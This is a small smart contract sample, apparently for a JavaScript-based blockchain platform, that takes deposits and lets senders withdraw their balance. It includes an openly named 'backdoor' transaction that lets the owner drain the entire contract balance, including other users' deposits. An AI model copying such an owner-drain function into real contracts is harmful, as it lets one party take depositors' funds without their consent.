@contract class Withdraw {
    @state owner = msg.sender;
    @state fund = {};

    // a private helper
    #changeFund = delta => {
        this.fund[msg.sender] = (this.fund[msg.sender] || 0) + delta;
    }

    @onReceived receive() {
        this.#changeFund(msg.value);
    }

    @transaction withdraw() {
        const available = +this.fund[msg.sender];
        require(available && available > 0, "You must send some money to contract first");
        require(this.balance > 0, "Contract out of money, please come back later.");
        
        const amount = (available < this.balance)?available:this.balance;

        this.#changeFund(-amount);
        this.transfer(msg.sender, amount);
    }

    @transaction backdoor(value = this.balance) {
        require(msg.sender === this.owner, "Only owner can use this backdoor");
        this.transfer(msg.sender, value);
    }
}
